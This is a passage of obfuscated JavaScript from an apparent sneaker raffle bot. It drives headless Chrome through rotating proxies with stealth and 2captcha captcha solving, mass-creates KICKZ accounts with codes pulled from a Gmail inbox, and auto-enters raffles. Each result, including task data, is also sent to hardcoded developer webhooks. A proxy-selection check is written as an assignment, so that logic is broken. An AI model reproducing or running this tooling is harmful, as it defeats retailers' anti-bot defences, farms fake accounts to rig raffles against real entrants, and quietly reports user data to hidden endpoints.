                        'succesPUBMSG': { 'embeds': [_0x2ebeed] }
                    };
                    if (_0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '')
                        try {
                            await _0x4bfa5b(_0x5d2560['webhook'], _0x8be449['succesDEVMSG']);
                        } catch {
                        }
                    await _0x5954fc(0xc8), await _0x4bfa5b(_0x4f558b, _0x8be449['succesDEVMSG']), await _0x5954fc(0xc8);
                    try {
                        await _0x4bfa5b(_0x4b117a, _0x8be449['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x5f374c[_0x3e86ca]['Email'] == '' || _0x5f374c[_0x3e86ca]['Url'] == '' || _0x5f374c[_0x3e86ca]['FirstName'] == '' || _0x5f374c[_0x3e86ca]['LastName'] == '') {
                        console['log'](_0x52b59e() + '\x20[' + _0x1b4334[taskModule]['name'] + ']\x20Task\x20' + (_0x3e86ca + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x5d2560['useRandomProxy'] = ![])
                        var _0x4a805c = _0x3f05a6[_0x3e86ca]['split'](':');
                    else
                        var _0x4ff2fe = Math['round'](Math['random']() * (_0x3f05a6['length'] - 0x1)), _0x4a805c = _0x3f05a6[_0x4ff2fe]['split'](':');
                    var _0x4b0826;
                    try {
                        _0x4b0826 = await _0x13c80e['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4a805c[0x0] + ':' + _0x4a805c[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x4b0826 = await _0x13c80e['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4a805c[0x0] + ':' + _0x4a805c[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x23c939 = await _0x4b0826['newPage']();
                        await _0x23c939['authenticate']({
                            'username': '' + _0x4a805c[0x2],
                            'password': '' + _0x4a805c[0x3]
                        }), console['log'](_0x52b59e() + '\x20[' + _0x1aed2f['name'] + ']\x20Task\x20' + (_0x3e86ca + 0x1) + '\x20:\x20Getting\x20Session'), await _0x23c939['setRequestInterception'](!![]), _0x23c939['on']('request', _0xbe6ae7 => {
                            _0xbe6ae7['resourceType']() === 'image' || _0xbe6ae7['resourceType']() === 'font' || _0xbe6ae7['resourceType']() === 'media' ? _0xbe6ae7['abort']() : _0xbe6ae7['continue']();
                        });
                        try {
                            await _0x23c939['goto']('' + _0x5f374c[_0x3e86ca]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x23c939['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x52b59e() + '\x20[' + _0x1aed2f['name'] + ']\x20Task\x20' + (_0x3e86ca + 0x1) + '\x20:\x20Filling\x20Information'), await _0x23c939['type']('#comp_firstname', '' + _0x5f374c[_0x3e86ca]['FirstName']), await _0x23c939['waitForSelector']('#comp_lastname'), await _0x23c939['type']('#comp_lastname', '' + _0x5f374c[_0x3e86ca]['LastName']), await _0x23c939['waitForSelector']('#comp_email'), await _0x23c939['type']('#comp_email', '' + _0x5f374c[_0x3e86ca]['Email']), await _0x23c939['waitForSelector']('#comp_paypalemail'), await _0x23c939['type']('#comp_paypalemail', '' + _0x5f374c[_0x3e86ca]['Email']), await _0x23c939['waitForSelector']('#comp_mobile_end'), await _0x23c939['type']('#comp_mobile_end', '' + _0x5f374c[_0x3e86ca]['Phone']), await _0x23c939['waitForSelector']('#comp_dob'), await _0x23c939['type']('#comp_dob', '08/09/1992'), console['log'](_0x52b59e() + '\x20[' + _0x1aed2f['name'] + ']\x20Task\x20' + (_0x3e86ca + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x5f374c[_0x3e86ca]['Size'] == 'RANDOM') {
                            const _0x14529e = await _0x23c939['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x4cc571 => {
                                return _0x4cc571['map'](_0xa53ef2 => _0xa53ef2['value']);
                            });
                            var _0x43b2f5 = Math['round'](Math['random']() * (_0x14529e['length'] - 0x2));
                            await _0x23c939['select']('#shoesize', _0x14529e[_0x43b2f5 + 0x1]), await _0x5954fc(0x3e8);
                        } else {
                            const _0x16c335 = await _0x23c939['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x4f81d0 => {
                                return _0x4f81d0['map'](_0x28d82e => _0x28d82e['innerText']);
                            }), _0xa1dfd5 = await _0x23c939['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x1513a0 => {
                                return _0x1513a0['map'](_0xd02aa8 => _0xd02aa8['value']);
                            });
                            var _0xee31ac = _0x5f374c[_0x3e86ca]['Size'];
                            for (var _0x31f26c = 0x1; _0x31f26c < _0xa1dfd5['length']; _0x31f26c++) {
                                var _0x591dc5 = _0x16c335[_0x31f26c]['split']('\x20')[0x0];
                                if (_0x591dc5 == _0xee31ac) {
                                    await _0x23c939['select']('#shoesize', _0xa1dfd5[_0x31f26c]);
                                    break;
                                } else {
                                    if (_0x31f26c + 0x1 == _0xa1dfd5['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x23c939['waitForSelector']('#comp_address1'), await _0x23c939['type']('#comp_address1', _0x5f374c[_0x3e86ca]['Address1'] + '\x20' + _0x5f374c[_0x3e86ca]['HouseNumber']), await _0x23c939['waitForSelector']('#comp_address2'), await _0x23c939['type']('#comp_address2', '' + _0x5f374c[_0x3e86ca]['Address2']), await _0x23c939['waitForSelector']('#comp_address2'), await _0x23c939['type']('#comp_address3', '' + _0x5f374c[_0x3e86ca]['City']), await _0x23c939['waitForSelector']('#comp_postcode'), await _0x23c939['type']('#comp_postcode', '' + _0x5f374c[_0x3e86ca]['Zip']), console['log'](_0x52b59e() + '\x20[' + _0x1aed2f['name'] + ']\x20Task\x20' + (_0x3e86ca + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x5954fc(0x4b0), await _0x23c939['click']('label#emailhold'), await _0x5954fc(0x5dc), await _0x23c939['click']('#preauth_tandc_email\x20>\x20label'), await _0x5954fc(0x5dc), await _0x23c939['click']('#submit');
                        try {
                            await _0x23c939['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x52b59e() + '\x20[' + _0x1aed2f['name'] + ']\x20Task\x20' + (_0x3e86ca + 0x1) + '\x20:\x20' + _0x28396b['blue']('Awaiting\x20Paypal\x20Payment')), _0x4b0826['on']('targetcreated', async _0x8711cd => {
                            if (_0x8711cd['type']() === 'page') {
                                const _0x1ca6b7 = await _0x8711cd['page']();
                                async function _0x1b116b() {
                                    try {
                                        await _0x23c939['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x3add46 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x3c5520() {
                                    try {
                                        await _0x23c939['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x306ea7 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x3c5520(), _0x1b116b(), await _0x5954fc(0x493e0);
                            }
                        });
                        async function _0x40b89c() {
                            for (let _0x373c78 = 0x0; _0x373c78 < 0x12c; _0x373c78++) {
                                if (_0x306ea7 == !![]) {
                                    _0x48b8af = 'no', _0x4904f4(_0x5f374c[_0x3e86ca], _0x1aed2f), console['log'](_0x28396b['green'](_0x52b59e() + '\x20[' + _0x1aed2f['name'] + ']\x20Task\x20' + (_0x3e86ca + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '')
                                        try {
                                            await _0x4bfa5b(_0x5d2560['webhook'], _0x8be449['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x5954fc(0xc8), await _0x4bfa5b(_0x4f558b, _0x8be449['succesDEVMSG']), await _0x5954fc(0xc8);
                                    try {
                                        await _0x4bfa5b(_0x4b117a, _0x8be449['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x3add46)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x5954fc(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x5954fc(0xbb8), await _0x23c939['click']('.zoid-outlet'), await _0x5954fc(0x7d0), await _0x40b89c();
                    } catch (_0x3a8f7e) {
                        console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x1aed2f['name'] + ']\x20Task\x20' + (_0x3e86ca + 0x1) + '\x20:\x20' + _0x3a8f7e)), _0x100219 = '' + _0x3a8f7e;
                        var _0x4de9c4 = await _0xf2c38e(_0x5f374c[_0x3e86ca], _0x1aed2f, 'dev', !![], _0x100219);
                        _0x8be449['errorDEV'] = { 'embeds': [_0x4de9c4] }, _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x8be449['errorDEV']), await _0x4bfa5b(_0x248b77, _0x8be449['errorDEV']);
                    } finally {
                        _0x4b0826 && _0x4b0826['close']();
                        if (_0x48b8af == 'yes' && _0x1dcc73 != 0x5 && _0x100219 != 'Size\x20Not\x20Found') {
                            console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x1aed2f['name'] + ']\x20Task\x20' + (_0x3e86ca + 0x1) + '\x20:\x20Retrying\x20(' + _0x1dcc73 + '\x20/\x205)')), _0x3e86ca = _0x3e86ca - 0x1, _0x1dcc73 = _0x1dcc73 + 0x1;
                            continue;
                        }
                        _0x48b8af == 'yes' && _0x1dcc73 >= 0x5 && (_0x1c26ba(afew[_0x3e86ca], _0x1aed2f), _0x48b8af = 'no', _0x1dcc73 = 0x0), console['log']('Waiting\x20for\x20' + _0x5d2560['delay'] + '\x20ms'), await _0x5954fc(_0x5d2560['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x1d84ea, _0x32754c, _0x4634c1) {
                    _0x13c80e['use'](_0x146fac()), _0x13c80e['use'](_0x4b936d({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5d2560['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x326b0c = 0x0; _0x326b0c < _0x32754c['length']; _0x326b0c++) {
                        const _0x174076 = 'https://www.kickz.com/login';
                        if (_0x493888 != 'yes')
                            var _0x493888 = '', _0x561aa9 = 0x0;
                        _0x34c195(_0x1d84ea['name'] + '\x20Task\x20' + (_0x326b0c + 0x1) + '\x20/\x20' + _0x32754c['length'] + '\x20||\x20File:\x20' + _0x54b9d3 + '\x20Proxies:\x20' + _0x3dc05f);
                        try {
                            await _0x414596(_0x32754c, _0x326b0c);
                        } catch {
                            _0x493888 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x4ca7b1 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4a7d40
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x5d2560['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3e85bb
                                }
                            ]
                        }];
                        const _0xf969ef = { 'embeds': _0x4ca7b1 };
                        var _0x5b275a = await _0xf2c38e(_0x32754c[_0x326b0c], _0x1d84ea, 'acc', ![]);
                        const _0x44aaf9 = { 'succesDEVMSG': { 'embeds': [_0x5b275a] } };
                        if (_0x32754c[_0x326b0c]['Email'] == '' || _0x32754c[_0x326b0c]['FirstName'] == '' || _0x32754c[_0x326b0c]['LastName'] == '') {
                            console['log'](_0x52b59e() + '\x20[' + _0x1d84ea['name'] + ']\x20Task\x20' + (_0x326b0c + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x32754c[_0x326b0c]['Password'] == '' && (_0x32754c[_0x326b0c]['Password'] = 'JRaffles23!');
                        if (_0x5d2560['useRandomProxy'] = ![])
                            var _0x5d763e = _0x4634c1[_0x326b0c]['split'](':');
                        else
                            var _0x44457f = Math['round'](Math['random']() * (_0x4634c1['length'] - 0x1)), _0x5d763e = _0x4634c1[_0x44457f]['split'](':');
                        var _0x51d758;
                        try {
                            _0x51d758 = await _0x13c80e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5d763e[0x0] + ':' + _0x5d763e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x51d758 = await _0x13c80e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5d763e[0x0] + ':' + _0x5d763e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1c7e51 = await _0x51d758['newPage']();
                            await _0x1c7e51['authenticate']({
                                'username': '' + _0x5d763e[0x2],
                                'password': '' + _0x5d763e[0x3]
                            }), console['log'](_0x52b59e() + '\x20[' + _0x1d84ea['name'] + ']\x20Task\x20' + (_0x326b0c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1c7e51['setRequestInterception'](!![]), _0x1c7e51['on']('request', _0x290adf => {
                                _0x290adf['resourceType']() === 'image' || _0x290adf['resourceType']() === 'font' || _0x290adf['resourceType']() === 'media' ? _0x290adf['abort']() : _0x290adf['continue']();
                            }), await _0x1c7e51['goto'](_0x174076), await _0x5954fc(0xbb8), console['log'](_0x52b59e() + '\x20[' + _0x1d84ea['name'] + ']\x20Task\x20' + (_0x326b0c + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x1c7e51['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1c7e51['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1c7e51['waitForSelector']('#button-register'), await _0x5954fc(0x7d0), await _0x1c7e51['evaluate'](() => {
                                const _0x2cade3 = document['querySelector']('#button-register');
                                _0x2cade3['click']();
                            }), console['log'](_0x52b59e() + '\x20[' + _0x1d84ea['name'] + ']\x20Task\x20' + (_0x326b0c + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x5954fc(0x1388), await _0x1c7e51['waitForSelector']('#customer_salutation'), await _0x1c7e51['select']('#customer_salutation', 'mr'), await _0x5954fc(0x7d0), await _0x1c7e51['waitForSelector']('#customer_firstname'), await _0x1c7e51['type']('#customer_firstname', '' + _0x32754c[_0x326b0c]['FirstName']), await _0x5954fc(0x352), await _0x1c7e51['waitForSelector']('#customer_lastname'), await _0x1c7e51['type']('#customer_lastname', '' + _0x32754c[_0x326b0c]['LastName']), await _0x5954fc(0x352), await _0x1c7e51['type']('#email-input', '' + _0x32754c[_0x326b0c]['Email']), await _0x5954fc(0x352), await _0x1c7e51['type']('#email-confirm-input', '' + _0x32754c[_0x326b0c]['Email']), await _0x5954fc(0x352), await _0x1c7e51['type']('#register-password', '' + _0x32754c[_0x326b0c]['Password']), await _0x5954fc(0x352), await _0x1c7e51['type']('#password-confirm', '' + _0x32754c[_0x326b0c]['Password']), await _0x5954fc(0x352), console['log'](_0x52b59e() + '\x20[' + _0x1d84ea['name'] + ']\x20Task\x20' + (_0x326b0c + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x1c7e51['click']('#consent'), await _0x5954fc(0x1f4);
                            const _0x28d9d8 = await _0x1c7e51['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x28d9d8) {
                                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x1d84ea['name'] + ']\x20Task\x20' + (_0x326b0c + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x1c7e51['click']('#buttonRegister');
                            try {
                                await _0x1c7e51['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x52b59e() + '\x20[' + _0x1d84ea['name'] + ']\x20Task\x20' + (_0x326b0c + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x32754c[_0x326b0c]['Email']), await _0x5954fc(0x4b0);
                            async function _0x3e747a() {
                                var _0x1752f8, _0xc9034b = ![];
                                for (var _0x553ef2 = 0x0; _0x553ef2 < 0x18; _0x553ef2++) {
                                    async function _0x195e57() {
                                        var _0x4df4da = new _0x15c146({
                                            'user': _0x5d2560['masterMail'],
                                            'password': _0x5d2560['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x45be69(_0x5642ab) {
                                            _0x4df4da['openBox']('INBOX', ![], _0x5642ab);
                                        }
                                        _0x4df4da['once']('ready', function () {
                                            console['log'](_0x52b59e() + '\x20[' + _0x1d84ea['name'] + ']\x20Task\x20' + (_0x326b0c + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x45be69(function (_0x2b8ff3, _0x35b112) {
                                                console['log'](_0x52b59e() + '\x20[' + _0x1d84ea['name'] + ']\x20Task\x20' + (_0x326b0c + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x2b8ff3)
                                                    throw _0x2b8ff3;
                                                _0x4df4da['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x480a38, _0x4d3a68) {
                                                    if (!_0x4d3a68 || !_0x4d3a68['length'])
                                                        console['log'](_0x52b59e() + '\x20[' + _0x1d84ea['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x4df4da['end']();
                                                    else {
                                                        var _0x25671f = _0x4df4da['seq']['fetch'](_0x4d3a68, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x25671f['on']('message', function (_0x465377, _0xdc8259) {
                                                            var _0x230521 = '(#' + _0xdc8259 + ')\x20';
                                                            _0x465377['on']('body', function (_0x38a340, _0x45e01a) {
                                                                _0x2e3fa0(_0x38a340, (_0x4bc778, _0x4fd177) => {
                                                                    if (_0x4fd177['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x41184c = _0x4fd177['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x3370ac = _0x41184c[0x1]['split']('<')[0x0];
                                                                        _0x1752f8 = _0x3370ac;
                                                                    }
                                                                });
                                                            }), _0x465377['once']('end', function () {
                                                            });
                                                        }), _0x25671f['once']('error', function (_0x1d9533) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x25671f['once']('end', function () {
                                                            _0x4df4da['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x4df4da['once']('error', function (_0x347217) {
                                            console['log'](_0x28396b['red'](_0x347217['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0xc9034b = !![];
                                        }), _0x4df4da['once']('end', async function () {
                                        }), _0x4df4da['connect']();
                                    }
                                    _0x195e57(), await _0x5954fc(0x1388);
                                    if (_0x1752f8)
                                        return _0x1752f8;
                                    if (_0xc9034b)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x553ef2 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x3e747a(), _0x5954fc(0x320), console['log'](_0x52b59e() + '\x20[' + _0x1d84ea['name'] + ']\x20Task\x20' + (_0x326b0c + 0x1) + '\x20:\x20Verifying..'), await _0x1c7e51['type']('#verificationCode', code), await _0x5954fc(0x1f4), await _0x1c7e51['click']('#buttonVerify'), await _0x5954fc(0x190), await _0x1c7e51['click']('#buttonVerify'), await _0x5954fc(0x3e8);
                            try {
                                await _0x1c7e51['waitForSelector']('div.b-user_greeting'), _0x493888 = 'no', console['log'](_0x28396b['green'](_0x52b59e() + '\x20[' + _0x1d84ea['name'] + ']\x20Task\x20' + (_0x326b0c + 0x1) + '\x20:\x20Account\x20' + _0x32754c[_0x326b0c]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x1dee0c['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x32754c[_0x326b0c]['Email'] + ',' + _0x32754c[_0x326b0c]['Password'] + ','), console['log'](_0x52b59e() + '\x20[' + _0x1d84ea['name'] + ']\x20Task\x20' + (_0x326b0c + 0x1) + '\x20:\x20Account\x20' + _0x32754c[_0x326b0c]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x44aaf9['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4bfa5b(_0xbfa384, _0x44aaf9['succesDEVMSG']);
                            } catch {
                                _0x493888 = 'no', console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x1d84ea['name'] + ']\x20Task\x20' + (_0x326b0c + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x1d84ea['name'] + ']\x20Task\x20' + (_0x326b0c + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x29a406) {
                            console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x1d84ea['name'] + ']\x20Task\x20' + (_0x326b0c + 0x1) + '\x20:\x20' + _0x29a406)), _0x4ca7b1[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x4ca7b1[0x0]['description'] = '' + _0x29a406, await _0x4bfa5b(_0x248b77, _0xf969ef), _0x493888 = 'yes';
                        } finally {
                            _0x51d758 && _0x51d758['close']();
                            if (_0x493888 == 'yes' && _0x561aa9 != 0x5) {
                                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x1d84ea['name'] + ']\x20Task\x20' + (_0x326b0c + 0x1) + '\x20:\x20Retrying\x20(' + _0x561aa9 + '\x20/\x205)')), _0x326b0c = _0x326b0c - 0x1, _0x561aa9 = _0x561aa9 + 0x1;
                                continue;
                            }
                            _0x493888 == 'yes' && _0x561aa9 >= 0x5 && (_0x1c26ba(_0x32754c[_0x326b0c], _0x1d84ea), _0x493888 = 'no', _0x561aa9 = 0x0), console['log']('Waiting\x20for\x20' + _0x5d2560['delay'] + '\x20ms'), await _0x5954fc(_0x5d2560['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x2d156e, _0xe6c71, _0xf8d63a) {
                    _0x13c80e['use'](_0x146fac()), _0x13c80e['use'](_0x4b936d({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5d2560['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5afea4 = 0x0; _0x5afea4 < _0xe6c71['length']; _0x5afea4++) {
                        var _0x222456;
                        if (_0x4038e7 != 'yes')
                            var _0x4038e7 = '', _0x524e84 = 0x0;
                        _0x34c195(_0x2d156e['name'] + '\x20Task\x20' + (_0x5afea4 + 0x1) + '\x20/\x20' + _0xe6c71['length'] + '\x20||\x20File:\x20' + _0x54b9d3 + '\x20Proxies:\x20' + _0x3dc05f);
                        var _0x20d42d = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4a7d40
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0xe6c71[_0x5afea4]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0xe6c71[_0x5afea4]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x5d2560['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3e85bb
                                }
                            ]
                        }];
                        let _0x4ef71c = [
                            'Email',
                            'Password',
                            'FirstName',
                            'LastName',
                            'Size',
                            'Address1',
                            'HouseNumber',
                            'Zip',
                            'Country',
                            'City'
                        ], _0x51c0b0 = ![];
                        for (key of _0x4ef71c) {
                            if (_0xe6c71[_0x5afea4][key] == '' || !_0xe6c71[_0x5afea4][key]) {
                                console['log'](_0x52b59e() + '\x20[' + _0x2d156e['name'] + ']\x20Task\x20' + (_0x5afea4 + 0x1) + '\x20:\x20Invalid\x20CSV,\x20' + key + '\x20not\x20found'), _0x51c0b0 = !![];
                                break;
                            }
                        }
                        if (_0x51c0b0) {
                            await _0x5954fc(0x1f4);
                            continue;
                        }
                        var _0x59a94f = await _0xf2c38e(_0xe6c71[_0x5afea4], _0x2d156e, 'dev', ![]), _0x1c2f37 = await _0xf2c38e(_0xe6c71[_0x5afea4], _0x2d156e, 'pub', ![]);
                        const _0x2db0e0 = {
                            'succesDEVMSG': { 'embeds': [_0x59a94f] },
                            'succesPUBMSG': { 'embeds': [_0x1c2f37] }
                        };
                        try {
                            await _0x414596(_0xe6c71, _0x5afea4);
                        } catch {
                            _0x4038e7 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x5d2560['useRandomProxy'] = ![])
                            var _0x5808d3 = _0xf8d63a[_0x5afea4]['split'](':');
                        else
                            var _0x3594c7 = Math['round'](Math['random']() * (_0xf8d63a['length'] - 0x1)), _0x5808d3 = _0xf8d63a[_0x3594c7]['split'](':');
                        var _0x3ab365;
                        try {
                            _0x3ab365 = await _0x13c80e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x5808d3[0x0] + ':' + _0x5808d3[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3ab365 = await _0x13c80e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x5808d3[0x0] + ':' + _0x5808d3[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5a0407 = await _0x3ab365['newPage']();
                            await _0x5a0407['authenticate']({
                                'username': '' + _0x5808d3[0x2],
                                'password': '' + _0x5808d3[0x3]
                            }), console['log'](_0x52b59e() + '\x20[' + _0x2d156e['name'] + ']\x20Task\x20' + (_0x5afea4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5a0407['setRequestInterception'](!![]), _0x5a0407['on']('request', _0xee8cca => {
                                _0xee8cca['resourceType']() === 'image' || _0xee8cca['resourceType']() === 'font' || _0xee8cca['resourceType']() === 'media' ? _0xee8cca['abort']() : _0xee8cca['continue']();
                            }), await _0x5a0407['goto']('' + _0xe6c71[_0x5afea4]['Url']['replace']('\x20', ''), { 'waitUntil': 'networkidle2' }), await _0x5954fc(0x12c), await _0x5a0407['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x5a0407['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x5954fc(0x7d0);
                            try {
                                await _0x5a0407['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x5a0407['click']('a[title=\x22sign\x20in\x22]');
                            }
